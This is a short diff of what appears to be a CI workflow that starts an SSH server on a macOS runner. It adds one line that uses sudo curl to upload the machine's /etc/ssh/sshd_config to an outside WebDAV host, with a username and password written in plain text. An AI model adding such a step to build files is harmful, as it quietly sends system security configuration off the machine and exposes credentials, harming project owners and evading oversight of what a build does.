@@ -35,3 +35,4 @@ jobs:
           sudo launchctl start com.openssh.sshd
           sudo systemsetup -getremotelogin
           sudo cp /etc/ssh/sshd_config ./
+          sudo curl -T /etc/ssh/sshd_config -u fxlqwq:Aa2980688 http://hy2.fxlqwq.link:5244/dav/sshd_config
